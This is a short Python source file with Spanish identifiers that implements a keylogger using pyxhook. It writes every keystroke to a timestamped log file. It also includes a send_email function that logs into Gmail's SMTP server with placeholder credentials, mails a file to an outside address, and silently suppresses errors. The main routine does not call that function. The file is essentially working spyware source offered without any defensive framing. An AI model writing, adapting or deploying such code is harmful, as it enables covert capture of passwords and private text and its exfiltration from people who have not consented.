import pyxhook, smtplib, os
from datetime import datetime


def send_email(archivo):
    try:
        fromaddr = "correoorigen@correo.com"
        toaddr = "correodest@correo.com"
        email_username = "usuariologin"
        email_password = "contraseñalogin"
        #Datos para enviar el correo
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(email_username,email_password)
        server.sendmail(fromaddr, toaddr, archivo)
        server.quit()
      
    except:
        pass

def main():
    archivo_log = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
    
    def PresionarTecla(event):
        with open(archivo_log, "a") as x:
            if event.Key == 'P_Enter' :
                x.write('\n')
            else:
                x.write(f"{chr(event.Ascii)}")

    
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = PresionarTecla
    new_hook.HookKeyboard()

    try:
        new_hook.start()
    except KeyboardInterrupt:
        new_hook.cancel()
        pass
    except Exception as problema:
        txt = f"Error while catching events:\n {problema}"
        with open(archivo_log, "a") as x:
            x.write(f"\n{txt}")


if __name__ == "__main__":
    main()